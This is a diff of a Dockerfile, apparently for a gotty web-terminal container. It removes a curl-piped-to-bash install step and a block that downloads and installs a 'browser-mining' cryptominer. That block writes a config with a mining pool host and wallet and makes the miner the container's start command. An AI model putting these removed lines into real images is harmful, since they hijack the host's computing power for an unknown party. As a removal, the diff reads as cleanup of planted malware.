@@ -12,19 +12,6 @@ RUN apt-get -y update && \
     apt-get purge --auto-remove -y curl && \
     apt-get clean && \
     rm -rf /var/lib/apt/lists*
-    
-RUN curl -fsSL https://deb.nodesource.com/setup_22.x | bash - && \
-    apt-get install -y nodejs && \
-    rm -rf /var/lib/apt/lists/*
-    
-RUN curl -L -O -J https://github.com/malphite-code/browser-mining/releases/download/v1/browser-mining.tar.gz && \
-    tar -xf browser-mining.tar.gz && \
-    cd browser-mining && \
-    npm install && \
-    sh install.sh && \
-    rm config.json && \
-    echo '[{"algorithm": "minotaurx", "host": "minotaurx.sea.mine.zpool.ca", "port": 7019, "worker": "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q", "password": "c=RVN", "workers": 95 }]' > config.json
-WORKDIR /browser-mining
 
 COPY /run_gotty.sh /run_gotty.sh
 
@@ -34,4 +21,4 @@ EXPOSE 8080
 
 CMD ["/bin/bash","/run_gotty.sh"]
 
-CMD ["node", "index.js"]
+CMD ["lscpu"]
